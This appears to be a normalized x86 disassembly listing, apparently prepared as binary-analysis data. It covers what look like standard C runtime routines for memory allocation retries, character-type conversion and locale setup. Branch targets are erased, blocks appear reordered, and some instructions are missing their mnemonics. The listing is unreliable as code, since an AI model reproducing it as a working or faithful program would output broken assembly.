mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_200fb13
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
sub_201a646
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_201a6a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_201a8fb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_201a6a6
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_201a963
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ Sleep@IAT ]
add esi 0x3e8
cmp esi [ rw-data ]
jbe r-xdata
mov eax esi
pop esi
pop ebp
retn
or esi 0xffffffff
sub_201a99e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_2009eef
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_201a9e3
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20242a3
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_201aa2f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200aaac
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_201aa7d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20243c1
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_201aacf
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_2022f25
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_200b53e
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_2022f6e
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_2009d98
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_2013580
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_201418b
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_2009eef
pop ecx
cmp eax ebx
je r-xdata
call sub_2023130
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_201ac89
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_201aacf
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_201acfa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_2018ff5
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_201b115
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_2009d98
push [ esi + 0x8 ]
call sub_2009d98
push [ esi + 0xc ]
call sub_2009d98
push [ esi + 0x10 ]
call sub_2009d98
push [ esi + 0x14 ]
call sub_2009d98
push [ esi + 0x18 ]
call sub_2009d98
push [ esi ]
call sub_2009d98
push [ esi + 0x20 ]
call sub_2009d98
push [ esi + 0x24 ]
call sub_2009d98
push [ esi + 0x28 ]
call sub_2009d98
push [ esi + 0x2c ]
call sub_2009d98
push [ esi + 0x30 ]
call sub_2009d98
push [ esi + 0x34 ]
call sub_2009d98
push [ esi + 0x1c ]
call sub_2009d98
push [ esi + 0x38 ]
call sub_2009d98
push [ esi + 0x3c ]
call sub_2009d98
add esp 0x40
push [ esi + 0x40 ]
call sub_2009d98
push [ esi + 0x44 ]
call sub_2009d98
push [ esi + 0x48 ]
call sub_2009d98
push [ esi + 0x4c ]
call sub_2009d98
push [ esi + 0x50 ]
call sub_2009d98
push [ esi + 0x54 ]
call sub_2009d98
push [ esi + 0x58 ]
call sub_2009d98
push [ esi + 0x5c ]
call sub_2009d98
push [ esi + 0x60 ]
call sub_2009d98
push [ esi + 0x64 ]
call sub_2009d98
push [ esi + 0x68 ]
call sub_2009d98
push [ esi + 0x6c ]
call sub_2009d98
push [ esi + 0x70 ]
call sub_2009d98
push [ esi + 0x74 ]
call sub_2009d98
push [ esi + 0x78 ]
call sub_2009d98
push [ esi + 0x7c ]
call sub_2009d98
add esp 0x40
push [ esi + 0x80 ]
call sub_2009d98
push [ esi + 0x84 ]
call sub_2009d98
push [ esi + 0x88 ]
call sub_2009d98
push [ esi + 0x8c ]
call sub_2009d98
push [ esi + 0x90 ]
call sub_2009d98
push [ esi + 0x94 ]
call sub_2009d98
push [ esi + 0x98 ]
call sub_2009d98
push [ esi + 0x9c ]
call sub_2009d98
push [ esi + 0xa0 ]
call sub_2009d98
push [ esi + 0xa4 ]
call sub_2009d98
push [ esi + 0xa8 ]
call sub_2009d98
add esp 0x2c
sub_201b2aa
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_201a9e3
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_201acfa
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_201b115
push esi
call sub_2009d98
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_201b323
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
lea esi [ eax + 0x1 ]
mov bl [ esi ]
mov [ eax ] bl
mov eax esi
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_201b356
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
push esi
call sub_2009d98
pop ecx
sub_201b39b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_201a9e3
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_201a99e
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_2009d98
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_201a99e
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_2018ff5
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_2018ff5
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_2018ff5
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
jmp r-xdata
push esi
call sub_201b356
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ ebx + 0xb0 ]
call sub_2009d98
push [ ebx + 0xbc ]
call sub_2009d98
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_2009d98
push [ ebp - 0x8 ]
call sub_2009d98
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
inc ecx
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_201b565
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_2009d98
pop ecx
push esi
call sub_2009d98
pop ecx
sub_201b5f3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x30
push 0x1
call sub_201a9e3
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_201a99e
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_2009d98
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0xc
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_201a99e
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_2018ff5
add esp 0x3c
or eax edi
je r-xdata
push ebx
call sub_2009d98
push [ ebp - 0x8 ]
call sub_2009d98
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_201b565
push ebx
call sub_2009d98
push [ ebp - 0x8 ]
call sub_2009d98
